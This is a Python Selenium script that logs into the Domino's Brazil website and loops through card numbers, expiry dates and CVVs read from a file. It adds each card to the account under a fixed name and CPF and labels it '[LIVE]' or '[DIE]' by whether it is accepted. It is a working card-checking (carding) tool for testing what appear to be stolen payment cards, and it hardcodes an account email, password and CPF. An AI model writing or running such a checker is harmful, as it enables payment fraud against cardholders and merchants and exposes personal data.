import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

def login_dominos(email, password):
    driver = webdriver.Chrome()
    wait = WebDriverWait(driver, 15)

    try:
        print("Acessando a página de login...")
        driver.get("https://www.dominos.com.br/login")

        print("Procurando o botão 'Login com senha'...")
        btn_login_senha = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//*[contains(text(), 'Login com senha')] | //ion-button[contains(., 'Login com senha')]")
        ))
        driver.execute_script("arguments[0].click();", btn_login_senha)

        input_email = wait.until(EC.visibility_of_element_located((By.ID, "ion-input-0")))
        input_email.clear()
        input_email.send_keys(email)

        input_senha = wait.until(EC.visibility_of_element_located((By.ID, "ion-input-1")))
        input_senha.clear()
        input_senha.send_keys(password)

        btn_entrar = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//*[contains(text(), 'Entrar')] | //ion-button[contains(., 'Entrar')]")
        ))
        driver.execute_script("arguments[0].click();", btn_entrar)
        
        print("Login submetido! Aguardando redirecionamento...\n")
        time.sleep(5)

        print("Acessando https://www.dominos.com.br/my-cards ...")
        driver.get("https://www.dominos.com.br/my-cards")
        time.sleep(4)

        if not os.path.exists("card.txt"):
            print("Arquivo card.txt não encontrado! Crie o arquivo e rode novamente.")
            return

        with open("card.txt", "r") as f:
            linhas = f.readlines()

        for linha in linhas:
            linha = linha.strip()
            if not linha:
                continue
            
            partes = linha.split("|")
            if len(partes) != 4:
                continue
            
            numero, mes, ano, cvv = partes

            try:
                driver.get("https://www.dominos.com.br/my-cards")
                time.sleep(3)

                btn_add_cartao = wait.until(EC.element_to_be_clickable(
                    (By.XPATH, "//*[contains(translate(text(), 'ADICIONAR NOVO CARTÃO', 'adicionar novo cartão'), 'adicionar novo cartão')] | //ion-button[contains(translate(., 'ADICIONAR NOVO CARTÃO', 'adicionar novo cartão'), 'adicionar novo cartão')]")
                ))
                driver.execute_script("arguments[0].click();", btn_add_cartao)
                time.sleep(2)

                ion_apelido = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='name']")))
                driver.execute_script("arguments[0].scrollIntoView(true);", ion_apelido)
                time.sleep(0.5)
                ActionChains(driver).move_to_element(ion_apelido).click().send_keys("Afonso Claudio").perform()

                ion_titular = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='holderName']")))
                ActionChains(driver).move_to_element(ion_titular).click().send_keys("Afonso Claudio").perform()

                ion_cpf = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='cpf']")))
                ActionChains(driver).move_to_element(ion_cpf).click().send_keys("84830336072").perform()
                
                data_validade = f"{mes}{ano[-2:]}" if len(ano) == 4 else f"{mes}{ano}"

                time.sleep(2)
                
                try: 
                    iframe_num = driver.find_elements(By.XPATH, "//iframe[@title='Iframe para número do cartão']")
                    if iframe_num: driver.switch_to.frame(iframe_num[0])
                    input_numero = wait.until(EC.presence_of_element_located((By.ID, "encryptedCardNumber")))
                    input_numero.send_keys(numero)
                finally:
                    driver.switch_to.default_content()

                try: 
                    iframe_exp = driver.find_elements(By.XPATH, "//iframe[@title='Iframe para data de validade']")
                    if iframe_exp: driver.switch_to.frame(iframe_exp[0])
                    input_validade = wait.until(EC.presence_of_element_located((By.ID, "encryptedExpiryDate")))
                    input_validade.send_keys(data_validade)
                finally:
                    driver.switch_to.default_content()

                try: 
                    iframe_cvv = driver.find_elements(By.XPATH, "//iframe[@title='Iframe para código de segurança']")
                    if iframe_cvv: driver.switch_to.frame(iframe_cvv[0])
                    input_cvv = wait.until(EC.presence_of_element_located((By.ID, "encryptedSecurityCode")))
                    input_cvv.send_keys(cvv)
                finally:
                    driver.switch_to.default_content()

                btn_salvar = wait.until(EC.presence_of_element_located(
                    (By.XPATH, "//*[translate(text(), 'SALVR', 'salvr')='salvar'] | //ion-button[contains(translate(., 'SALVR', 'salvr'), 'salvar')]")
                ))
                driver.execute_script("arguments[0].click();", btn_salvar)
                
                time.sleep(5)
                
                try:
                    cpf_ainda = driver.find_element(By.XPATH, "//input[@placeholder='CPF do titular']")
                    if cpf_ainda.is_displayed():
                        print(f"[DIE] {numero}")
                    else:
                        print(f"[LIVE] {numero}")
                except:
                    print(f"[LIVE] {numero}")
                    
            except Exception as ex:
                print(f"[DIE] {numero}")
                print(f"Erro: {ex}")

    except Exception as e:
        print(f"Ocorreu um erro no pipeline principal: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    MEU_EMAIL = "p808409@gmail.com"
    MINHA_SENHA = "@P808409p10"
    
    login_dominos(MEU_EMAIL, MINHA_SENHA)
